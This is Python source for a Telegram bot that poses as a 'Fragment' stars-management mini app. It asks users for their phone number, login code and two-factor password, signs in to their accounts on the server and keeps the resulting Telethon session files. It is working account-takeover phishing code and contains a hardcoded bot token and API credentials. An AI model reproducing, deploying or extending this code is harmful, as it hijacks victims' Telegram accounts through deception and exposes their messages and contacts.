import asyncio
import logging
import sqlite3
import os
from datetime import datetime, timedelta
from aiogram import Bot, Dispatcher, F
from aiogram.filters import CommandStart
from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
from telethon import TelegramClient
from telethon.errors import PhoneNumberInvalidError, FloodWaitError

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

BOT_TOKEN = "7511789367:AAGVIDu27Sb5ZwJUjQRiHOJ-CZinbRUFrDQ"

# ========== API ДАННЫЕ ==========
API_ID = 28687552
API_HASH = "1abf9a58d0c22f62437bec89bd6b27a3"

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# База данных
def init_db():
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS auth_sessions (
            user_id INTEGER PRIMARY KEY,
            phone TEXT,
            step TEXT,
            session_expires TIMESTAMP
        )
    ''')
    conn.commit()
    conn.close()

init_db()
os.makedirs("sessions", exist_ok=True)

def save_auth_session(user_id, phone, step="phone"):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    expires = datetime.now() + timedelta(minutes=30)
    cursor.execute('INSERT OR REPLACE INTO auth_sessions (user_id, phone, step, session_expires) VALUES (?, ?, ?, ?)',
                   (user_id, phone, step, expires))
    conn.commit()
    conn.close()

def clear_auth_session(user_id):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('DELETE FROM auth_sessions WHERE user_id = ?', (user_id,))
    conn.commit()
    conn.close()

user_clients = {}

@dp.message(CommandStart())
async def start(message: Message):
    webapp_url = "https://stars-zdgz.onrender.com"
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🚀 Открыть Mini App", web_app=WebAppInfo(url=webapp_url))]
    ])
    await message.answer(
        "✨ Fragment — управляйте звёздами Telegram ✨\n\n"
        "Нажми кнопку, чтобы открыть мини-приложение",
        reply_markup=keyboard
    )

@dp.message(F.web_app_data)
async def handle_webapp(message: Message):
    data = message.web_app_data.data
    user_id = message.from_user.id

    logger.info(f"📩 Получены данные от {user_id}: {data}")

    try:
        import json
        payload = json.loads(data)
        action = payload.get("action")

        if action == "send_code":
            phone = payload.get("phone")
            if not phone:
                await message.answer("❌ Не указан номер")
                return

            save_auth_session(user_id, phone, "code")
            await message.answer(f"📱 Отправляю код на {phone}...")

            try:
                client = TelegramClient(f"sessions/user_{user_id}", API_ID, API_HASH)
                await client.connect()
                await client.send_code_request(phone)
                user_clients[user_id] = client
                await message.answer(f"✅ Код отправлен на {phone}\n\nВведите код в мини-приложении")
            except PhoneNumberInvalidError:
                await message.answer("❌ Неверный номер")
                clear_auth_session(user_id)
            except FloodWaitError as e:
                await message.answer(f"⚠️ Подождите {e.seconds} сек")
                clear_auth_session(user_id)
            except Exception as e:
                await message.answer(f"❌ Ошибка: {str(e)}")
                clear_auth_session(user_id)

        elif action == "check_code":
            code = payload.get("code")
            client = user_clients.get(user_id)
            if not client:
                await message.answer("❌ Сессия истекла")
                return

            try:
                await client.sign_in(code=code)
                me = await client.get_me()
                await message.answer(f"✅ Авторизация успешна!\n\n👤 {me.first_name}\n📱 {me.phone}")
                clear_auth_session(user_id)
            except Exception as e:
                await message.answer(f"❌ Ошибка: {str(e)}")

        elif action == "check_2fa":
            password = payload.get("password")
            client = user_clients.get(user_id)
            if not client:
                await message.answer("❌ Сессия истекла")
                return

            try:
                await client.sign_in(password=password)
                me = await client.get_me()
                await message.answer(f"✅ Авторизация успешна (2FA)!\n\n👤 {me.first_name}\n📱 {me.phone}")
                clear_auth_session(user_id)
            except Exception as e:
                await message.answer(f"❌ Неверный пароль 2FA")

    except Exception as e:
        logger.error(f"Ошибка: {e}")
        await message.answer(f"❌ Ошибка: {str(e)}")

async def main():
    await bot.delete_webhook()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
